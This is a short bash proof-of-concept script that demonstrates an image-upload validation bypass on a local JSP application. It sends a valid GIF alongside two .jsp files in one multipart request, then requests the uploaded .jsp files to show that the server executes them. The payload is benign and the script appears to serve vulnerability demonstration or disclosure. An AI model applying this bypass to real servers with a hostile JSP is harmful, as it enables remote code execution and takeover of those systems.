#!/usr/bin/env bash
# Educational demonstration. Payload only prints a string; no commands are run.
set -euo pipefail
cd "$(dirname "$0")/.."
U=http://localhost:8899/app/uploadImage.jsp

echo "## 1) baseline: a single .jsp is correctly rejected"
curl -s -F "img=@payloads/hello.jsp;type=application/octet-stream" "$U"; echo

echo "## 2) bypass: valid gif + two benign .jsp in one multipart request"
curl -s -F "a=@payloads/ok.gif;type=image/gif" \
        -F "b=@payloads/hello.jsp;type=application/octet-stream" \
        -F "c=@payloads/hello2.jsp;type=application/octet-stream" "$U"; echo

echo "## 3) a benign uploaded .jsp survived and is executed by the engine:"
for f in hello hello2; do
  echo -n "   GET /uploads/$f.jsp -> "
  curl -s "http://localhost:8899/uploads/$f.jsp" || true
done
echo
echo "If you see HELLO-FROM-UPLOADED-JSP, the non-image file bypassed validation AND executed."
